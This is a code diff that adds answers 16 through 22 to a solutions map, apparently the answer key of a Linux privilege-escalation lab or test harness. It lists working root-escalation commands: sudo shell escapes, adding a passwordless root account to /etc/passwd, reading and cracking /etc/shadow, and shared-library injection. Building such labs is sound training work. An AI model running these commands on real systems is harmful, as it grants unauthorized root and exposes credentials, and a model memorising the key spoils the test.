@@ -74,6 +74,13 @@ const SOLUTIONS = {
     13: ['ssh -i /opt/backup/id_rsa root@localhost'],
     14: ["echo 'player ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn", 'sudo bash'],
     15: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/x.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c', 'echo /tmp/x.so > /etc/ld.so.preload', '/usr/bin/passwd'],
+    16: ['sudo find . -exec /bin/sh \\;'],
+    17: ['sudo env /bin/sh'],
+    18: ["sudo python3 -c 'import os; os.system(\"/bin/sh\")'"],
+    19: ['sudo less !/bin/sh'],
+    20: ["echo 'r00t::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd", 'su r00t'],
+    21: ["python3 -c \"print(open('/etc/shadow').read())\"", 'john /tmp/shadow.copy', 'su root'],
+    22: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/libagent.so.1.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/libagent.so.1 /tmp/libagent.so.1.c', 'sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent'],
 };
 
 let pass = 0, fail = 0;
